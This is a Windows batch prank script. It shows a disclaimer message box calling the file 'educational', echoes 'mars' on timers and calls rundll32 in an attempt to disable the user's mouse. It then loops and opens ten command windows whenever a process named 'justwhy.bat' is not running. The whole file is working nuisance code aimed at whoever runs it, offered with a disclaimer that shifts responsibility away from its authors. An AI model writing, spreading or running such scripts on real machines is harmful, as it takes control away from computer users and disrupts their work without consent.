@echo off
echo x=msgbox("All files here are to be used for educational purposes only. Use all files as is; any modifications in any way immediatly deem them as no longer our responsibility. Any lawful action taken against individuals or an organization from use/distribution of these files is not our responsibility regardless of files edits or lack thereof (after posted publish date)." ,16, "WARNING") >> msgbox.vbs
start msgbox.vbs
echo hi.
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo mars is the best
rundll32.exe mouse, disable
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo mars
timeout /t 2 /nobreak
echo hi
rundll32.exe mouse, enable
timeout /t 6000
:start
tasklist /v | Find "justwhy.bat"
if "%ERRORLEVEL%"=="1" (
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  START cmd.exe
  exit
)
timeout /t 1 /NOBREAK >nul
goto :start
